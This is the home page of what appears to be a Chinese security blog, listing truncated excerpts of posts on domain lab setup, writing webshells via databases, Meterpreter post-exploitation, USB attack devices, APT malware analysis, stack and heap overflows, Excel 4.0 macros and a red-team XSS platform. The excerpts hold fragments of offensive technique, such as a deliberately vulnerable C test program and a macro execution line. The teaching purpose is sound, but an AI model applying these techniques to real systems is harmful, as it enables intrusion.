<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>ascotbe</title><meta name="author" content="ascotbe"><meta name="copyright" content="ascotbe"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta property="og:type" content="website">
<meta property="og:title" content="ascotbe">
<meta property="og:url" content="https://www.ascotbe.com/index.html">
<meta property="og:site_name" content="ascotbe">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://www.ascotbe.com/img/avatar.jpeg">
<meta property="article:author" content="ascotbe">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://www.ascotbe.com/img/avatar.jpeg"><link rel="shortcut icon" href="/img/favicon.ico"><link rel="canonical" href="https://www.ascotbe.com/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
    },
    fancybox: {
      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isanchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = { 
  isPost: false,
  isHome: true,
  isHighlightShrink: false,
  isToc: false,
  postUpdate: '2021-05-24 14:21:18'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    })(window)</script><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="ascotbe" type="application/atom+xml">
</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="/img/avatar.jpeg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">101</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/Loophole"><i class="fa-fw fa fa-link"></i><span> Loophole</span></a></div><div class="menus_item"><a class="site-page" href="/Taylor%20Swift"><i class="fa-fw fa fa-link"></i><span> Taylor Swift</span></a></div><div class="menus_item"><a class="site-page" href="/Links/"><i class="fa-fw fa fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa fa-heart"></i><span> About</span></a></div></div></div></div><div class="page" id="body-wrap"><header class="full_page" id="page-header" style="background-image: url('https://raw.staticdn.net/Ascotbe/Random-img/master/Blog/1.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">ascotbe</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/Loophole"><i class="fa-fw fa fa-link"></i><span> Loophole</span></a></div><div class="menus_item"><a class="site-page" href="/Taylor%20Swift"><i class="fa-fw fa fa-link"></i><span> Taylor Swift</span></a></div><div class="menus_item"><a class="site-page" href="/Links/"><i class="fa-fw fa fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="site-info"><h1 id="site-title">ascotbe</h1><div id="site-subtitle"><span id="subtitle"></span></div><div id="site_social_icons"><a class="social-icon" href="mailto:ascotbe@gmail.com" target="_blank" title=""><i class="fa fa-envelope"></i></a><a class="social-icon" href="/atom.xml" target="_blank" title=""><i class="fa fa-rss"></i></a></div></div><div id="scroll-down"><i class="fas fa-angle-down scroll-down-effects"></i></div></header><main class="layout" id="content-inner"><div class="recent-posts" id="recent-posts"><div class="recent-post-item"><div class="post_cover left_radius"><a href="/2020/08/03/IntranetPenetration/" title="红蓝功防相关笔记总结">     <img class="post_bg" src="https://raw.staticdn.net/Ascotbe/Random-img/master/BlogCover/112.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="红蓝功防相关笔记总结"></a></div><div class="recent-post-info"><a class="article-title" href="/2020/08/03/IntranetPenetration/" title="红蓝功防相关笔记总结">红蓝功防相关笔记总结</a><div class="article-meta-wrap"><span class="article-meta"><i class="fas fa-thumbtack sticky"></i><span class="sticky">置顶</span><span class="article-meta__separator">|</span></span><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-08-03T13:45:42.000Z" title="发表于 2020-08-03 21:45:42">2020-08-03</time><span class="article-meta__separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-05-17T00:31:53.389Z" title="更新于 2021-05-17 08:31:53">2021-05-17</time></span></div><div class="content">
声明

郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！

前言

本文全程紧跟jumbo师傅写的文章来复现，内网对我来说是一个新的领域，文章会参考多个师傅中的分析来完成，当然有些自己的想法在里面，后续如果有新思路会往这里面添加

PS

目前就差委派没有写了
搭建域环境
环境清单

由于我们需要域环境模拟常规的内网，所以搭建域环境

Windows 2008 R2 X64
Windows 10
Windows 7 SP1 X64

Windows需要执行set-executionpolicy remotesigned来打开默认不允许执行ps脚本
配置静态IP位置：网络和共享中心-&gt;本地连接-&gt;属性-&gt;IPV4
然后需要设置一个DNS指向本机，因为它后面是一个域控的角色，IP地址可以在详细信息里面看，最好和现在类似。

配置域环境在服务管理器中添加角色

然后勾选这个，这边提一句在创建域的时候还需要把当前用户设置为强密码

然后就是无脑下一步安装，就可以安装成功了

接着我们点开角色位 ...</div></div></div><div class="recent-post-item"><div class="post_cover right_radius"><a href="/2020/07/21/DatabaseWriteWebshell/" title="常见数据库写入Webshell汇总">     <img class="post_bg" src="https://raw.staticdn.net/Ascotbe/Random-img/master/BlogCover/108.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="常见数据库写入Webshell汇总"></a></div><div class="recent-post-info"><a class="article-title" href="/2020/07/21/DatabaseWriteWebshell/" title="常见数据库写入Webshell汇总">常见数据库写入Webshell汇总</a><div class="article-meta-wrap"><span class="article-meta"><i class="fas fa-thumbtack sticky"></i><span class="sticky">置顶</span><span class="article-meta__separator">|</span></span><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-07-21T13:45:42.000Z" title="发表于 2020-07-21 21:45:42">2020-07-21</time><span class="article-meta__separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-05-17T00:31:53.721Z" title="更新于 2021-05-17 08:31:53">2021-05-17</time></span></div><div class="content">
声明

郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！

前言

依旧是之前面试被毒打的问题，没玩过就玩一遍吧，目前只写了常见的3个数据库，如果后面又遇到其他的数据库在添加。
MySql数据库前提条件

数据库当前用户为root权限

知道当前网站的绝对路径

PHP的GPC为 off状态

写入的那个路径存在写入权限


注意点：

secure_file_priv参数说明

这个参数用来限制数据导入和导出操作的效果，例如执行LOAD DATA、SELECT … INTO OUTFILE语句和LOAD_FILE()函数。

如果这个参数为空，这个变量没有效果

如果这个参数设为一个目录名，MySQL服务只允许在这个目录中执行文件的导入和导出操作。这个目录必须存在，MySQL服务不会创建它

如果这个参数为NULL，MySQL服务会禁止导入和导出操作。这个参数在MySQL 5.7.6版本引入


如果遇到以下情况的话，使用SQL语句中的outfile是无法成功的，但是写入日志的方法是可以成功的
1sh ...</div></div></div><div class="recent-post-item"><div class="post_cover left_radius"><a href="/2020/05/06/MeterpreterCommand/" title="恶意程序研究之Meterpreter后渗透常用命令">     <img class="post_bg" src="https://raw.staticdn.net/Ascotbe/Random-img/master/BlogCover/100.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="恶意程序研究之Meterpreter后渗透常用命令"></a></div><div class="recent-post-info"><a class="article-title" href="/2020/05/06/MeterpreterCommand/" title="恶意程序研究之Meterpreter后渗透常用命令">恶意程序研究之Meterpreter后渗透常用命令</a><div class="article-meta-wrap"><span class="article-meta"><i class="fas fa-thumbtack sticky"></i><span class="sticky">置顶</span><span class="article-meta__separator">|</span></span><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-05-06T15:45:42.000Z" title="发表于 2020-05-06 23:45:42">2020-05-06</time><span class="article-meta__separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-05-17T00:32:35.016Z" title="更新于 2021-05-17 08:32:35">2021-05-17</time></span></div><div class="content">
声明

郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！
前言写免杀的时候在想，msf连上后能干啥？之前只有大概的了解下，具体没怎么实操，后面把之前写的文章过了一遍，然后谷歌了一下发现还有好多不知道的地方借此删除了去年写的那篇文章合并到了一起，本篇会持续更新，如果看到师傅们有什么新奇的操作都会记录下来


Metasploit体系框架
文件目录解析核心文件包括data、modules、scripts、tools、plugins
data该文件里常用的的功能在wordlists（字典）里面
modules该文件夹里包括了msf最核心的几个文件
123456auxiliary（漏洞辅助模块一般是没有攻击载荷的漏洞攻击)Exploits（渗透攻击模块)st（开发模块）pads（漏洞负载模块)Encode码器模块）Nops（空指令模块&gt;

scripts该文件夹里面包含这各种脚本
tools该文件夹中存放着大量的使用工具
plugins该文件夹放着大量插件
系统命令基本系统命令1234567891011s ...</div></div></div><div class="recent-post-item"><div class="post_cover right_radius"><a href="/2019/09/05/KnowledgeNavigationFile/" title="知识汇总导航文件">     <img class="post_bg" src="https://raw.staticdn.net/Ascotbe/Random-img/master/BlogCover/43.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="知识汇总导航文件"></a></div><div class="recent-post-info"><a class="article-title" href="/2019/09/05/KnowledgeNavigationFile/" title="知识汇总导航文件">知识汇总导航文件</a><div class="article-meta-wrap"><span class="article-meta"><i class="fas fa-thumbtack sticky"></i><span class="sticky">置顶</span><span class="article-meta__separator">|</span></span><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2019-09-05T13:45:42.000Z" title="发表于 2019-09-05 21:45:42">2019-09-05</time><span class="article-meta__separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-05-17T00:31:53.389Z" title="更新于 2021-05-17 08:31:53">2021-05-17</time></span></div><div class="content">写在最前面，本篇文章是对自己入坑安全1年来的一个整理概况，以及以后需要做的事情立一个模板本篇只涉及到Web渗透相关(脚本编写，病毒编写都不包括哪些必备的工具之类就跳过不写了！有些脑洞以及姿势一时半会想不起来，想到的时候再更新oh!shit~Knowing new things！
验证码相关手机短信接码
国内平台
123456789https://www.pdflibr.comhttps://www.visitorsms.com/cnhttps://www.becmd.comhttp://www.114sim.comhttps://yunduanxin.nethttp://www.smszk.comhttp://z-sms.comhttp://www.shejiinn.comhttps://sms.cngrok.com
国外平台
123456789101112131415161718192021222324252627https://ch.freephonenum.comhttps://smsreceivefree.comhttps://zh.mytrashmobile.comhttps ...</div></div></div><div class="recent-post-item"><div class="post_cover left_radius"><a href="/2019/08/12/LinuxStudyNotes/" title="Linux学习笔记">     <img class="post_bg" src="https://raw.staticdn.net/Ascotbe/Random-img/master/BlogCover/34.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Linux学习笔记"></a></div><div class="recent-post-info"><a class="article-title" href="/2019/08/12/LinuxStudyNotes/" title="Linux学习笔记">Linux学习笔记</a><div class="article-meta-wrap"><span class="article-meta"><i class="fas fa-thumbtack sticky"></i><span class="sticky">置顶</span><span class="article-meta__separator">|</span></span><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2019-08-12T15:58:53.000Z" title="发表于 2019-08-12 23:58:53">2019-08-12</time><span class="article-meta__separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-05-17T00:31:53.720Z" title="更新于 2021-05-17 08:31:53">2021-05-17</time></span></div><div class="content">于2020/3/18日重新排版修改
根目录解析
/ - 根目录
每一个文件和目录都从这里开始。
只有root用户具有该目录下的写权限。此目录和/root目录不同，/root目录是root用户的主目录。

/bin - 用户二进制文件
包含二进制可执行文件。
系统的所有用户使用的命令都设在这里，例如：ps，ls，ping，grep，cp等。

/sbin - 系统二进制文件
就像/bin，/sbin同样也包含二进制可执行文件。
但是，在这个目录下的linux命令通常由系统管理员使用，对系统进行维护。例如：iptables、reboot、fdisk、ifconfig、swapon命令。

/etc - 配置文件
包含所有程序所需的配置文件。
也包含了用于启动/停止单个程序的启动和关闭shell脚本。例如：/etc/resolv.conf、/etc/logrotate.conf

/dev - 设备文件
这些包括终端设备、USB或连接到系统的任何设备。例如：/dev/tty1、/dev/usbmon0

/proc - 进程信息
这是一个虚拟的文件系统，包含有关正在运行的进程的信息。例如：/ ...</div></div></div><div class="recent-post-item"><div class="post_cover right_radius"><a href="/2019/06/29/raspberry/" title="P4wnP1全家桶安装及实战">     <img class="post_bg" src="https://raw.staticdn.net/Ascotbe/Random-img/master/BlogCover/35.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="P4wnP1全家桶安装及实战"></a></div><div class="recent-post-info"><a class="article-title" href="/2019/06/29/raspberry/" title="P4wnP1全家桶安装及实战">P4wnP1全家桶安装及实战</a><div class="article-meta-wrap"><span class="article-meta"><i class="fas fa-thumbtack sticky"></i><span class="sticky">置顶</span><span class="article-meta__separator">|</span></span><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2019-06-29T02:57:46.000Z" title="发表于 2019-06-29 10:57:46">2019-06-29</time><span class="article-meta__separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-05-17T00:31:53.720Z" title="更新于 2021-05-17 08:31:53">2021-05-17</time></span></div><div class="content">
前言

今天想用自己USB入侵设备的时候，发现WIFI密码给忘了
重装的时候发现自己没有写详细过程！呸！！最后只能删了重写写过。


写在前头血的教训


树莓派没有那么容易坏不用买第二个！！

网上的wpa_supplicant.conf开启WIFI我试了N次都没成功过

USB转接头一定要买不需要焊接(别买Zero Quick Plug Bad USB

树莓派Zero W自带WIFI所以别再买WIFI模块了

装完P4wnP1切记重启不要直接拔掉会导致开不了机
1sudo shutdown -r now


成品图

硬件需求

树莓派Zero W
USB接头
TF卡一张



通过网线连接树莓派


首先在config.txt最末行处换行添加如下代码，打开usb网卡模式
1dtoverlay=dwc2
其次在cmdline.txt文件中找到rootwait字段，并在其后面空格添加如下信息，在打开系统时开启usb网卡模式。
1modules-load=dwc2,g_ether
然后把TF卡插入树莓派连接电脑，在串口中会出现串口COM，并且会弹出RNDIS未连接，接着右键点击我的 ...</div></div></div><div class="recent-post-item"><div class="post_cover left_radius"><a href="/2018/12/05/HardwareRelatedKnowledge/" title="硬件相关知识">     <img class="post_bg" src="https://raw.staticdn.net/Ascotbe/Random-img/master/BlogCover/39.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="硬件相关知识"></a></div><div class="recent-post-info"><a class="article-title" href="/2018/12/05/HardwareRelatedKnowledge/" title="硬件相关知识">硬件相关知识</a><div class="article-meta-wrap"><span class="article-meta"><i class="fas fa-thumbtack sticky"></i><span class="sticky">置顶</span><span class="article-meta__separator">|</span></span><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2018-12-05T12:02:59.000Z" title="发表于 2018-12-05 20:02:59">2018-12-05</time><span class="article-meta__separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-05-17T00:31:53.721Z" title="更新于 2021-05-17 08:31:53">2021-05-17</time></span></div><div class="content">
前言

对两年前的知识进行了下温习，发现好多坑都填上了，然后把之前的文章删了总结到了一篇，到时候还有些点需要填上
Windows/Linux的内存结构
栈的运算

首先会把EBP压入栈中，然后把ESP的值保存到EBP中，接着ESP会像低地址增加，EBP保持在栈底不动（高地址），所有运算结束后弹出所有的值ESP会到和EBP相同的值（大部分是这样的）

Windows的内存结构分布

首先是内存结构分布图，windows的内存默认是从0x80000000位置开始的


栈的增长方向是从高地址到低地址递增的，用下面一个例子来解释

例子一:
esp是栈指针，是cpu机制决定的，push、pop指令会自动调整esp的值；
ebp只是存取某时刻的esp，这个时刻就是进入一个函数内后，cpu会将esp的值赋给ebp，此时就可以通过ebp对栈进行操作，比如获取函数参数，局部变量等，实际上使用esp也可以；
假设执行print函数之前esp=Q
1234567891011121314151617181920212223main() &#123;&#x2F;&#x2F;执行test前print(int ...</div></div></div><div class="recent-post-item"><div class="post_cover right_radius"><a href="/2021/05/18/SampleAnalysis/0b2a794bac4bf650b6ba537137504162520b67266449be979679afbb14e8e5c0/" title="蔓灵花APT组织针对巴基斯坦定向攻击的样本分析">     <img class="post_bg" src="https://raw.staticdn.net/Ascotbe/Random-img/master/BlogCover/126.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="蔓灵花APT组织针对巴基斯坦定向攻击的样本分析"></a></div><div class="recent-post-info"><a class="article-title" href="/2021/05/18/SampleAnalysis/0b2a794bac4bf650b6ba537137504162520b67266449be979679afbb14e8e5c0/" title="蔓灵花APT组织针对巴基斯坦定向攻击的样本分析">蔓灵花APT组织针对巴基斯坦定向攻击的样本分析</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-05-18T15:45:42.000Z" title="发表于 2021-05-18 23:45:42">2021-05-18</time><span class="article-meta__separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-05-23T09:45:35.677Z" title="更新于 2021-05-23 17:45:35">2021-05-23</time></span></div><div class="content">
声明

郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！

前言

开个新坑，学习下样本分析看看有什么好的免杀技术能够让我整合的，第一篇文章就参考Crazyman师傅写文章的和网上各个沙箱的已有的内容



样本




文件类型
PE32 executable (console) Intel 80386, for MS Windows



文件大小
31KB


MD5
8d42c01180be7588a2a68ad96dd0cf85


SHA1
89a7861acb7983ad712ae9206131c96454a1b3d8


SHA256
0b2a794bac4bf650b6ba537137504162520b67266449be979679afbb14e8e5c0


时间戳
0x5C32FC2B (Mon Jan 07 15:13:47 2019)


PDB
c:\Users\Asterix\Documents\Visual Studio 2008\Projects\28NovDwn\ ...</div></div></div><div class="recent-post-item"><div class="post_cover left_radius"><a href="/2021/05/04/HeapOverflow_Linux_0x01/" title="Linux堆溢出总结（0x01）">     <img class="post_bg" src="https://raw.staticdn.net/Ascotbe/Random-img/master/BlogCover/123.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Linux堆溢出总结（0x01）"></a></div><div class="recent-post-info"><a class="article-title" href="/2021/05/04/HeapOverflow_Linux_0x01/" title="Linux堆溢出总结（0x01）">Linux堆溢出总结（0x01）</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-05-04T15:45:42.000Z" title="发表于 2021-05-04 23:45:42">2021-05-04</time><span class="article-meta__separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-05-17T02:11:20.060Z" title="更新于 2021-05-17 10:11:20">2021-05-17</time></span></div><div class="content">
声明

郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！

前言

HVV结束，终于能闲下来学习了，开新坑啦好耶



记个小知识点


libc是Linux下的ANSI C函数库。

glibc是Linux下的GUN C函数库。


Linux下原来的标准c库Linux libc逐渐不再被维护。Linux下面的标准c库不仅有这一个，如uclibc、klibc，以及上面被提到的Linux libc，但是glibc无疑是用得最多的。glibc在/lib目录下的.so文件为libc.so.6。
堆内存管理机制介绍不同平台的堆内存管理机制不相同，下面是几个常见平台的堆内存管理机制：



平台
堆内存分配机制



General purpose allocator
dlmalloc


glibc
ptmalloc2


free BSD and Firefox
jemalloc


Google
tcmalloc


Solaris
libumem


在 Linux 的 glibc 使用的 ptmall ...</div></div></div><div class="recent-post-item"><div class="post_cover right_radius"><a href="/2021/03/26/StackOverflow_Linux_0x03/" title="Linux栈溢出总结（0x03）">     <img class="post_bg" src="https://raw.staticdn.net/Ascotbe/Random-img/master/BlogCover/122.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Linux栈溢出总结（0x03）"></a></div><div class="recent-post-info"><a class="article-title" href="/2021/03/26/StackOverflow_Linux_0x03/" title="Linux栈溢出总结（0x03）">Linux栈溢出总结（0x03）</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-03-26T10:45:42.000Z" title="发表于 2021-03-26 18:45:42">2021-03-26</time><span class="article-meta__separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-05-17T02:10:15.663Z" title="更新于 2021-05-17 10:10:15">2021-05-17</time></span></div><div class="content">
声明

郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！

前言

上篇文章真的就是一改就花了一个月时间，然后发现篇幅有点太长了分割一下，感觉这篇也需要好久



记录

几个未填坑的点

如何计算出TLS的offset大小（EXP抄的，我也懵
SSP题目中，为什么当可执行文件足够小的时候，他的不同区段可能会被多次映射？


绕过PIE保护
测试代码（题目泄露地址）
12345678910111213//test.c#include &lt;unistd.h&gt;#include &lt;stdio.h&gt;void vuln_func() &#123;	char buf[128];	read(STDIN_FILENO, buf, 256);&#125;int main(int argc, char *argv[]) &#123;	printf(&quot;%p\n&quot;,&amp;main);	vuln_func();	write(STDOUT_FILENO, &quot;Hello wor ...</div></div></div><div class="recent-post-item"><div class="post_cover left_radius"><a href="/2021/01/27/OfficeExcelMacro/" title="Office Excel Macro">     <img class="post_bg" src="https://raw.staticdn.net/Ascotbe/Random-img/master/BlogCover/121.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Office Excel Macro"></a></div><div class="recent-post-info"><a class="article-title" href="/2021/01/27/OfficeExcelMacro/" title="Office Excel Macro">Office Excel Macro</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-01-27T10:45:42.000Z" title="发表于 2021-01-27 18:45:42">2021-01-27</time><span class="article-meta__separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-05-17T00:31:53.721Z" title="更新于 2021-05-17 08:31:53">2021-05-17</time></span></div><div class="content">
声明

郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！

前言

好久没笼统的学习了，梳理下Excel宏相关的东西以防下次要用的时候都不会。

关于宏据我所知微软office所支持的宏里面，目前有两种

1992年：微软在office中引用了名为Excel4.0的宏代码技术，也被成为XLM宏。Excel4.0宏代码写在表格中，宏代码的具体文件呈现为xml而不是二进制文件。
1993年：微软更新了Excel5.0技术，也就是现在常见的VBA宏代码。

从Excel2010到Excel2019全线产品都支持Excel4.0宏。同时微软也提到，虽然目前Microsoft Excel仍然支持Excel4.0宏，但还是建议用户使用VBA宏。
Macro 4.0简单利用在箭头位置点击右键-&gt;插入即可使用

接着会出现一个新建的宏表格，我们在表格中添加如下命令，即可完成一个简单的宏
12&#x3D;EXEC(&quot;calc.exe&quot;)&#x3D;ALERT(&quot;hello ascotb ...</div></div></div><div class="recent-post-item"><div class="post_cover right_radius"><a href="/2021/01/08/CrossSiteScripting/" title="从零开始编写XSS平台">     <img class="post_bg" src="https://raw.staticdn.net/Ascotbe/Random-img/master/BlogCover/120.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="从零开始编写XSS平台"></a></div><div class="recent-post-info"><a class="article-title" href="/2021/01/08/CrossSiteScripting/" title="从零开始编写XSS平台">从零开始编写XSS平台</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-01-08T10:45:42.000Z" title="发表于 2021-01-08 18:45:42">2021-01-08</time><span class="article-meta__separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-05-17T00:32:35.016Z" title="更新于 2021-05-17 08:32:35">2021-05-17</time></span></div><div class="content">
声明

郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！

前言

在我们日常渗透或者红队打点的时候都或多或少的会挖掘到XSS漏洞，由于红队钓鱼也经常用到XSS平台，虽然网上免费可以注册的平台很多，但是这些平台都是别人的首先钓鱼到的数据并不是只有你一个人可见，网站的管理员也可以看的到，这就会对某些敏感的红队项目的信息造成泄漏，其次网站也经常不稳定，尝尝十天半个月就要换一个平台重新来一次，所以这篇文章就来了~

项目地址：https://github.com/Ascotbe/Medusa



什么是XSS跨站脚本（英语：Cross-site scripting，通常简称为：XSS）是一种网站应用程序的安全漏洞攻击，是代码注入的一种。它允许恶意用户将代码注入到网页上，其他用户在观看网页时就会受到影响。这类攻击通常包含了HTML以及用户端脚本语言。
